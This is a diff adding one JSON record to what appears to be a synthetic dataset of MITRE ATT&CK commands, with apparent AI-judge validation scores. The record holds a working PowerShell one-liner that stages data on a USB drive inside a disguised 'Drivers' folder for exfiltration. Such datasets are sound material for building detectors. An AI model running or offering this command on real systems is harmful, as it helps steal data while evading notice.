@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | Select-Object -First 1 -ExpandProperty DriveLetter); New-Item -Path \"$dl:\\Drivers\" -ItemType Directory -Force | Out-Null; Expand-Archive -Path \"C:\\ProgramData\\drivers_cache.zip\" -DestinationPath \"$dl:\\Drivers\" -Force",
+  "explanation": "Expands a cache ZIP into a drivers-themed directory on the USB to blend in while staging exfiltrated content on removable media.",
+  "rationale_steps": [
+    "Identify a removable drive letter.",
+    "Create a plausible directory on the USB.",
+    "Extract a local archive directly to the USB device."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-5d877001-ef5b4c5a",
+  "source_prompt_hash": "5d877001",
+  "timestamp_utc": "2025-09-30T05:25:30.107478Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell command is well-formed with balanced quotes/braces, correct pipelines and semicolons, and valid cmdlets/parameters.",
+        "semantic_score": 5,
+        "semantic_justification": "It locates a removable drive, creates a drivers-named directory, and extracts a local ZIP into it, plausibly staging data on removable media consistent with T1052.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T09:42:32.011873Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax including balanced parentheses, correct variable assignment, proper piping, and valid cmdlet parameters.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by identifying a removable drive, creating a plausibly-named directory structure, and transferring data from the system to the removable media in a way that attempts to blend in as legitimate driver files.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T09:42:34.968003Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Powershell command is perfectly well-formed with correct syntax, balanced quotes and parentheses, valid command separators, and appropriate cmdlet flags.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the claimed intent and MITRE ATT&CK T1052 by identifying a removable drive, creating a plausible 'Drivers' directory for obfuscation, and transferring/staging content from the system to this removable medium via archive expansion, consistent with exfiltration over a physical medium.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T09:42:47.474114Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
